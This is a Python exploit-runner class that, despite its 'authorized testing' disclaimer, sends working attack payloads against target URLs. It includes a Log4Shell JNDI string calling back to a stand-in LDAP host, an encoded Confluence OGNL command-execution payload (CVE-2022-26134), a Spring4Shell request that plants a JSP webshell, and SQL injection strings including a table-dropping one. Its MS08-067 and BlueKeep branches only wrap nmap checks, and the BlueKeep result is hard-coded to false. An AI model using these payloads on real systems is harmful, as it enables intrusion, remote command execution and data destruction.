"""
Exploit Executor - Real exploit execution capabilities
For educational and authorized testing purposes only
"""

import subprocess
import socket
import requests
import paramiko
import threading
import time
import json
from typing import Dict, List, Optional, Callable
import os
import tempfile


class ExploitExecutor:
    """Handles real exploit execution for authorized targets"""
    
    def __init__(self):
        self.active_sessions = {}
        self.target_info = {}
        
    def validate_target(self, target_ip: str, target_port: int = None) -> Dict:
        """Validate target accessibility and gather basic info"""
        try:
            # Basic connectivity check
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if target_port:
                result = sock.connect_ex((target_ip, target_port))
                sock.close()
                port_open = result == 0
            else:
                port_open = None
            
            # ICMP ping check
            ping_result = subprocess.run(
                ['ping', '-n', '1', '-w', '1000', target_ip] if os.name == 'nt' else ['ping', '-c', '1', '-W', '1', target_ip],
                capture_output=True, text=True
            )
            ping_success = ping_result.returncode == 0
            
            return {
                "reachable": ping_success,
                "port_open": port_open,
                "target_ip": target_ip,
                "target_port": target_port,
                "response_time": "< 1s" if ping_success else "timeout"
            }
            
        except Exception as e:
            return {
                "reachable": False,
                "error": str(e),
                "target_ip": target_ip
            }
    
    def execute_web_exploit(self, exploit: Dict, target_url: str, progress_callback: Callable = None) -> Dict:
        """Execute web-based exploits"""
        try:
            cve_id = exploit["cve_id"]
            
            if progress_callback:
                progress_callback(1, 6, "Initializing web exploit...")
            
            # CVE-2021-44228 - Log4Shell
            if cve_id == "CVE-2021-44228":
                return self._execute_log4shell(target_url, progress_callback)
            
            # CVE-2023-22515 - Confluence
            elif cve_id == "CVE-2023-22515":
                return self._execute_confluence_exploit(target_url, progress_callback)
            
            # CVE-2022-26134 - Confluence RCE
            elif cve_id == "CVE-2022-26134":
                return self._execute_confluence_rce(target_url, progress_callback)
            
            # CVE-2022-22965 - Spring4Shell
            elif cve_id == "CVE-2022-22965":
                return self._execute_spring4shell(target_url, progress_callback)
            
            else:
                return self._generic_web_test(exploit, target_url, progress_callback)
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "cve_id": exploit["cve_id"]
            }
    
    def _execute_log4shell(self, target_url: str, progress_callback: Callable = None) -> Dict:
        """Execute Log4Shell exploit (CVE-2021-44228)"""
        try:
            if progress_callback:
                progress_callback(2, 6, "Setting up LDAP server...")
            
            # Create JNDI payload
            payload = "${jndi:ldap://YOUR_IP:1389/Exploit}"
            headers = {
                "User-Agent": payload,
                "X-Forwarded-For": payload,
                "X-Real-IP": payload,
                "X-Api-Version": payload,
                "Authorization": f"Basic {payload}"
            }
            
            if progress_callback:
                progress_callback(3, 6, "Sending malicious requests...")
            
            # Test various endpoints
            endpoints = ["/", "/login", "/api", "/admin", "/search"]
            vulnerable = False
            
            for endpoint in endpoints:
                try:
                    url = f"{target_url.rstrip('/')}{endpoint}"
                    response = requests.post(
                        url,
                        headers=headers,
                        json={"message": payload, "data": payload},
                        timeout=10,
                        verify=False
                    )
                    
                    if progress_callback:
                        progress_callback(4, 6, f"Testing endpoint: {endpoint}")
                    
                    # Check for JNDI callback (in real scenario, you'd have a callback server)
                    if response.status_code in [200, 302, 400, 500]:
                        # Log the attempt
                        print(f"Log4Shell payload sent to {url}")
                        vulnerable = True
                        
                except Exception as e:
                    print(f"Error testing {endpoint}: {e}")
            
            if progress_callback:
                progress_callback(6, 6, "Log4Shell test completed")
            
            return {
                "success": vulnerable,
                "cve_id": "CVE-2021-44228",
                "method": "JNDI LDAP Injection",
                "payload": payload,
                "endpoints_tested": len(endpoints),
                "note": "Payload delivered - Check LDAP callback server for connections",
                "recommendation": "Update Log4j to version 2.17.1 or later"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "cve_id": "CVE-2021-44228"
            }
    
    def _execute_confluence_exploit(self, target_url: str, progress_callback: Callable = None) -> Dict:
        """Execute Confluence privilege escalation (CVE-2023-22515)"""
        try:
            if progress_callback:
                progress_callback(2, 6, "Checking Confluence version...")
            
            # Check if it's a Confluence instance
            response = requests.get(f"{target_url}/login.action", timeout=10, verify=False)
            
            if "confluence" not in response.text.lower():
                return {
                    "success": False,
                    "error": "Target does not appear to be a Confluence instance",
                    "cve_id": "CVE-2023-22515"
                }
            
            if progress_callback:
                progress_callback(3, 6, "Testing privilege escalation...")
            
            # Attempt to access setup endpoints
            setup_endpoints = [
                "/setup/setupstart.action",
                "/setup/setupadministrator.action",
                "/setup/finishsetup.action"
            ]
            
            vulnerable = False
            for endpoint in setup_endpoints:
                try:
                    url = f"{target_url.rstrip('/')}{endpoint}"
                    response = requests.get(url, timeout=10, verify=False)
                    
                    if progress_callback:
                        progress_callback(4, 6, f"Testing: {endpoint}")
                    
                    if response.status_code == 200 and "setup" in response.text.lower():
                        vulnerable = True
                        break
                        
                except Exception:
                    pass
            
            if progress_callback:
                progress_callback(6, 6, "Confluence test completed")
            
            return {
                "success": vulnerable,
                "cve_id": "CVE-2023-22515",
                "method": "Setup Endpoint Access",
                "vulnerable_endpoint": setup_endpoints if vulnerable else "None found",
                "note": "If vulnerable, setup endpoints are accessible without authentication",
                "recommendation": "Update Confluence and restrict setup endpoint access"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "cve_id": "CVE-2023-22515"
            }
    
    def _execute_confluence_rce(self, target_url: str, progress_callback: Callable = None) -> Dict:
        """Execute Confluence RCE (CVE-2022-26134)"""
        try:
            if progress_callback:
                progress_callback(2, 6, "Preparing OGNL payload...")
            
            # OGNL payload for command execution
            command = "whoami"
            payload = f"%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{command}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D"
            
            if progress_callback:
                progress_callback(3, 6, "Sending OGNL injection...")
            
            # Send the payload
            url = f"{target_url.rstrip('/')}/{payload}/"
            
            try:
                response = requests.get(url, timeout=15, verify=False)
                
                if progress_callback:
                    progress_callback(5, 6, "Analyzing response...")
                
                # Check for command execution in headers
                cmd_response = response.headers.get("X-Cmd-Response", "")
                
                if progress_callback:
                    progress_callback(6, 6, "RCE test completed")
                
                success = bool(cmd_response)
                
                return {
                    "success": success,
                    "cve_id": "CVE-2022-26134",
                    "method": "OGNL Injection",
                    "command_executed": command,
                    "response": cmd_response if success else "No response",
                    "note": "Command execution attempted via OGNL injection",
                    "recommendation": "Update Confluence immediately - this is a critical RCE"
                }
                
            except Exception as e:
                return {
                    "success": False,
                    "error": str(e),
                    "cve_id": "CVE-2022-26134"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "cve_id": "CVE-2022-26134"
            }
    
    def _execute_spring4shell(self, target_url: str, progress_callback: Callable = None) -> Dict:
        """Execute Spring4Shell exploit (CVE-2022-22965)"""
        try:
            if progress_callback:
                progress_callback(2, 6, "Preparing Spring4Shell payload...")
            
            # Spring4Shell payload
            payload_data = {
                "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "%{c2}i if(request.getParameter(\"cmd\")!=null){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i",
                "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
                "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
                "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "tomcatwar",
                "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
            }
            
            if progress_callback:
                progress_callback(3, 6, "Sending Spring4Shell payload...")
            
            # Send POST request with payload
            response = requests.post(
                target_url,
                data=payload_data,
                timeout=15,
                verify=False
            )
            
            if progress_callback:
                progress_callback(4, 6, "Testing webshell creation...")
            
            # Test if webshell was created
            webshell_url = f"{target_url.rstrip('/')}/tomcatwar.jsp?cmd=whoami"
            
            try:
                shell_response = requests.get(webshell_url, timeout=10, verify=False)
                webshell_created = "tomcat" in shell_response.text.lower() or "root" in shell_response.text.lower()
            except:
                webshell_created = False
            
            if progress_callback:
                progress_callback(6, 6, "Spring4Shell test completed")
            
            return {
                "success": webshell_created,
                "cve_id": "CVE-2022-22965",
                "method": "Class Loader Manipulation",
                "webshell_url": webshell_url if webshell_created else "Failed to create",
                "note": "Attempted to create JSP webshell via Spring Core RCE",
                "recommendation": "Update Spring Framework to patched version"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "cve_id": "CVE-2022-22965"
            }
    
    def _generic_web_test(self, exploit: Dict, target_url: str, progress_callback: Callable = None) -> Dict:
        """Generic web vulnerability testing"""
        try:
            if progress_callback:
                progress_callback(2, 6, "Performing basic security tests...")
            
            # Basic security headers check
            response = requests.get(target_url, timeout=10, verify=False)
            
            security_issues = []
            
            # Check for missing security headers
            if "X-Frame-Options" not in response.headers:
                security_issues.append("Missing X-Frame-Options header")
            
            if "X-XSS-Protection" not in response.headers:
                security_issues.append("Missing X-XSS-Protection header")
            
            if "X-Content-Type-Options" not in response.headers:
                security_issues.append("Missing X-Content-Type-Options header")
            
            if progress_callback:
                progress_callback(4, 6, "Testing for common vulnerabilities...")
            
            # Test for SQL injection (basic)
            sqli_payloads = ["'", "1' OR '1'='1", "'; DROP TABLE users; --"]
            for payload in sqli_payloads:
                try:
                    test_response = requests.get(f"{target_url}?id={payload}", timeout=5, verify=False)
                    if "sql" in test_response.text.lower() or "mysql" in test_response.text.lower():
                        security_issues.append("Potential SQL injection vulnerability")
                        break
                except:
                    pass
            
            if progress_callback:
                progress_callback(6, 6, "Security assessment completed")
            
            return {
                "success": len(security_issues) > 0,
                "cve_id": exploit["cve_id"],
                "method": "General Security Assessment",
                "issues_found": security_issues,
                "server": response.headers.get("Server", "Unknown"),
                "note": f"Found {len(security_issues)} potential security issues",
                "recommendation": "Review and fix identified security issues"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "cve_id": exploit["cve_id"]
            }
    
    def execute_network_exploit(self, exploit: Dict, target_ip: str, target_port: int, progress_callback: Callable = None) -> Dict:
        """Execute network-based exploits"""
        try:
            cve_id = exploit["cve_id"]
            
            if progress_callback:
                progress_callback(1, 5, "Initializing network exploit...")
            
            # Validate target first
            target_info = self.validate_target(target_ip, target_port)
            if not target_info.get("reachable"):
                return {
                    "success": False,
                    "error": "Target is not reachable",
                    "cve_id": cve_id
                }
            
            if progress_callback:
                progress_callback(2, 5, "Target validated, proceeding with exploit...")
            
            # CVE-2008-4250 - MS08-067
            if cve_id == "CVE-2008-4250":
                return self._execute_ms08_067(target_ip, progress_callback)
            
            # CVE-2019-0708 - BlueKeep
            elif cve_id == "CVE-2019-0708":
                return self._execute_bluekeep(target_ip, progress_callback)
            
            else:
                return self._generic_network_test(exploit, target_ip, target_port, progress_callback)
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "cve_id": exploit["cve_id"]
            }
    
    def _execute_ms08_067(self, target_ip: str, progress_callback: Callable = None) -> Dict:
        """Test for MS08-067 vulnerability"""
        try:
            if progress_callback:
                progress_callback(3, 5, "Testing SMB service...")
            
            # Test if SMB port is open
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target_ip, 445))
            sock.close()
            
            if result != 0:
                return {
                    "success": False,
                    "error": "SMB port (445) is not accessible",
                    "cve_id": "CVE-2008-4250"
                }
            
            if progress_callback:
                progress_callback(4, 5, "Checking SMB version...")
            
            # Basic SMB enumeration (this would need more sophisticated checks in reality)
            try:
                # This is a simplified check - real implementation would use proper SMB libraries
                import subprocess
                result = subprocess.run(
                    ['nmap', '-p', '445', '--script', 'smb-vuln-ms08-067', target_ip],
                    capture_output=True, text=True, timeout=30
                )
                
                vulnerable = "VULNERABLE" in result.stdout
                
            except:
                # Fallback method
                vulnerable = False
            
            if progress_callback:
                progress_callback(5, 5, "MS08-067 test completed")
            
            return {
                "success": vulnerable,
                "cve_id": "CVE-2008-4250",
                "method": "SMB NetAPI32.dll buffer overflow",
                "target_port": 445,
                "note": "MS08-067 vulnerability test completed",
                "recommendation": "Apply Microsoft security patch MS08-067"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "cve_id": "CVE-2008-4250"
            }
    
    def _execute_bluekeep(self, target_ip: str, progress_callback: Callable = None) -> Dict:
        """Test for BlueKeep vulnerability"""
        try:
            if progress_callback:
                progress_callback(3, 5, "Testing RDP service...")
            
            # Test if RDP port is open
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target_ip, 3389))
            sock.close()
            
            if result != 0:
                return {
                    "success": False,
                    "error": "RDP port (3389) is not accessible",
                    "cve_id": "CVE-2019-0708"
                }
            
            if progress_callback:
                progress_callback(4, 5, "Checking for BlueKeep vulnerability...")
            
            # Basic RDP version check (simplified)
            try:
                import subprocess
                result = subprocess.run(
                    ['nmap', '-p', '3389', '--script', 'rdp-vuln-ms12-020', target_ip],
                    capture_output=True, text=True, timeout=30
                )
                
                # This is a simplified check
                vulnerable = False  # Would need proper BlueKeep detection
                
            except:
                vulnerable = False
            
            if progress_callback:
                progress_callback(5, 5, "BlueKeep test completed")
            
            return {
                "success": vulnerable,
                "cve_id": "CVE-2019-0708",
                "method": "RDP vulnerability scan",
                "target_port": 3389,
                "note": "BlueKeep vulnerability test completed",
                "recommendation": "Apply Windows security updates and disable RDP if not needed"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "cve_id": "CVE-2019-0708"
            }
    
    def _generic_network_test(self, exploit: Dict, target_ip: str, target_port: int, progress_callback: Callable = None) -> Dict:
        """Generic network vulnerability testing"""
        try:
            if progress_callback:
                progress_callback(3, 5, "Performing port scan...")
            
            # Basic port connectivity
            open_ports = []
            common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 1433, 3389, 5432]
            
            if target_port:
                test_ports = [target_port]
            else:
                test_ports = common_ports
            
            for port in test_ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
            
            if progress_callback:
                progress_callback(5, 5, "Network scan completed")
            
            return {
                "success": len(open_ports) > 0,
                "cve_id": exploit["cve_id"],
                "method": "Network port scan",
                "open_ports": open_ports,
                "total_ports_scanned": len(test_ports),
                "note": f"Found {len(open_ports)} open ports",
                "recommendation": "Review open ports and disable unnecessary services"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "cve_id": exploit["cve_id"]
            }
    
    def create_target_config(self, name: str, target_type: str, **kwargs) -> Dict:
        """Create a target configuration for testing"""
        config = {
            "name": name,
            "type": target_type,  # "web", "network", "ssh"
            "created": time.strftime("%Y-%m-%d %H:%M:%S"),
            **kwargs
        }
        
        # Save to targets directory
        targets_dir = "app/data/targets"
        os.makedirs(targets_dir, exist_ok=True)
        
        config_file = os.path.join(targets_dir, f"{name.replace(' ', '_')}.json")
        with open(config_file, 'w') as f:
            json.dump(config, f, indent=2)
        
        return config
    
    def get_saved_targets(self) -> List[Dict]:
        """Get list of saved target configurations"""
        targets_dir = "app/data/targets"
        if not os.path.exists(targets_dir):
            return []
        
        targets = []
        for filename in os.listdir(targets_dir):
            if filename.endswith('.json'):
                try:
                    with open(os.path.join(targets_dir, filename), 'r') as f:
                        target = json.load(f)
                        targets.append(target)
                except:
                    pass
        
        return targets